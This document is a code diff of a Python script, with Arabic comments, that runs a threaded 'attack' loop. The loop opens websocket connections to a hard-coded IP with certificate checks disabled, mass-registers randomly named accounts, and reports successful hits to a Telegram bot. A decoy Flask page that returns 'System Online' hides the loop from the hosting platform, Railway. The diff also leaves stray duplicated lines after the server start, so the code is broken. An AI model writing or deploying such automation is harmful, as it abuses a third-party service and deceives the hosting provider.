@@ -1,14 +1,23 @@
-import requests, os, sys, time
+import os
+import threading
+from flask import Flask
 from ssl import CERT_NONE
 from gzip import decompress
 from random import choice, choices
 from concurrent.futures import ThreadPoolExecutor
 from json import dumps
+import requests
+import time
+
+# --- إعدادات الخادم الوهمي لإرضاء Railway ---
+app = Flask(__name__)
+@app.route('/')
+def home():
+    return "System Online"
 
 # --- إعدادات سحب البيانات من بيئة Railway ---
 TOKEN = os.getenv("BOT_TOKEN")
 ID = os.getenv("CHAT_ID")
-# ---------------------------------------
 
 try:
     from websocket import create_connection
@@ -21,7 +30,6 @@ def attack_logic():
         user = choice('qwertyuioplkjhgfdsazxcvbnm') + ''.join(choices(list('qwertyuioplkjhgfdsazxcvbnm1234567890'), k=12))
         try:
             ws = create_connection("wss://193.200.173.45/Auth", sslopt={"cert_reqs": CERT_NONE}, timeout=15)
-            # [span_0](start_span)استخدام بيانات Payload المستخرجة[span_0](end_span)
             payload = {
                 "action": "Register",
                 "subaction": "Desktop",
@@ -33,7 +41,23 @@ def attack_logic():
             }
             ws.send(dumps(payload))
             response = decompress(ws.recv()).decode('utf-8')
-            
+            if '"status":"Success"' in response:
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ID, "text": f"✅ Hit!\nUser: {user}\nPass: hhhh"})
+            ws.close()
+        except:
+            time.sleep(1)
+
+def start_attack():
+    with ThreadPoolExecutor(max_workers=20) as executor: # تقليل الخيوط لضمان استقرار الخادم الوهمي
+        for _ in range(20):
+            executor.submit(attack_logic)
+
+if __name__ == "__main__":
+    # تشغيل الهجوم في خيط منفصل
+    threading.Thread(target=start_attack, daemon=True).start()
+    # تشغيل الخادم الوهمي على المنفذ الذي يطلبه Railway
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
             if '"status":"Success"' in response:
                 msg = f"✅ Hit on Railway!\nUser: {user}\nPass: hhhh"
                 requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ID, "text": msg})
